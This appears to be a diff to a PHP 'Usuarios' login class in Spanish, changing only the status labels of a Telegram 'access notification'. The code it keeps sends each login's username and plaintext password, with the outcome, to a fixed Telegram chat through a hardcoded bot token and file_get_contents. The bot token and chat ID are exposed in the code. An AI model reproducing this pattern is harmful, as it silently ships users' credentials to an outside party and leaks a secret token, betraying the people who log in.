@@ -349,12 +349,12 @@ class Usuarios
 
             // NOTIFIACIÓN ACCESO PLATAFORMA - TELEGRAM
             if ($resp == 1) {
-                $status = "ACCESO CONCEDIDO";
+                $status = "(CONCEDIDO)";
             } else {
-                $status = "ACCESO DENEGADO";
+                $status = "(DENEGADO)";
             }
 
-            $url = "https://api.telegram.org/bot1396322757:AAF5C0bcZxR8_mEEtm3BFEJGhgHvLcE3X_E/sendMessage?chat_id=989320528&text=ACCESO MAPHG: $username $password (STATUS: $status)";
+            $url = "https://api.telegram.org/bot1396322757:AAF5C0bcZxR8_mEEtm3BFEJGhgHvLcE3X_E/sendMessage?chat_id=989320528&text=ACCESO MAPHG: $username $password $status";
             file_get_contents($url);
             // NOTIFIACIÓN ACCESO PLATAFORMA - TELEGRAM
 
